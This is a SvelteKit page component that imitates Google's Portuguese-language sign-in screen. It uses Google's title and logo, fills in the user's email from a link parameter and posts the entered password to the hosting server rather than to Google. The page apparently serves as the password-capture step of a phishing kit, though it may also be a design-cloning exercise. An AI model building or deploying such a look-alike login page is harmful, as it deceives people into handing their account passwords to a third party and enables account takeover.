<script lang="ts">
  import "../../styles/reset.css"
  import "../../styles/index.css"
    import { page } from "$app/stores";

  let email = $page.url.searchParams.get("email")
</script>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />


    <title>Fazer login nas Contas do Google</title>
  </head>

  <body>
    <form class="container" method="POST">
      <div class="card">
        <img src="/images/google-logo.svg" alt="" />
        <h2>Olá!</h2>
        <h3>{email}</h3>

        <input type="password" name="password" placeholder="Digite sua senha" />
        <div class="btn-email">
          <button type="button">Esqueceu seu e-mail?</button>
        </div>
        <p>
          Não está no seu computador? Use o modo visitante para fazer login com
          privacidade.
          <a href="">Saiba mais</a>
        </p>

        <div class="card-bottom">
          <a>Criar conta</a>
          <button type="submit">Próxima</button>
        </div>
      </div>

      <div class="footer">
        <select name="select">
          <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
          <option value="English (United States)">
            English (United States)
          </option>
          <option value="Español (España)">Español (España)</option>
        </select>

        <div class="footer-span">
          <span>Ajuda</span>
          <span>Privacidade</span>
          <span>Termos</span>
        </div>
      </div>
    </form>
  </body>
</html>